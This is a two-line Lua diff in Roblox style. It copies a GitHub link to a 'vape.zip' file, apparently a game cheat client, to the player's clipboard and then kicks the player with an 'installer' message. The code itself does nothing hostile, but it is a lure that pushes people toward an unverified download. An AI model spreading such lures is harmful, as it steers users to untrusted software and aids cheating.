@@ -1,0 +1,2 @@
+setclipboard("https://github.com/e266cfd65ad46a67fc54b0efd38e40dd/Purple-theme/raw/main/vape.zip")
+game.Players.LocalPlayer:Kick("Installer add to clip borad")
